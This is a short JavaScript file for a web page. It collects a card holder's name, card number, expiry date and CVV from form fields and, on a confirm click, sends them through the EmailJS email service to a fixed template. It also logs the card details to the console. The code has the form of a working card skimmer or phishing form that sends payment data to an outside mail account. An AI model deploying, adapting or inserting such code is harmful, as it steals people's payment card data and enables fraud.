console.log("line");



function sendMail () {
    
    var parms = {
        holderName: document.querySelector(".k-holderName").value,
        cardNumber: document.querySelector(".k-cardNumber").value,
        exMonth: document.querySelector(".k-exMonth").value,
        exYear: document.querySelector(".k-exYear").value,
        cvv: document.querySelector(".k-cvv").value,
    }

    const serviceID = "service_hnqtgz9";
    const templateID = "template_7l6ykzs";
    

    emailjs.send(serviceID, templateID, parms)
    .then(
        (res) => {
            
            console.log(res);
        }


    )
    .catch((err) => console.log(err));

    console.log(document.querySelector(".k-holderName").value);
    console.log(document.querySelector(".k-cardNumber").value);
    

}

document.querySelector(".confirm_btn").addEventListener("click", sendMail);
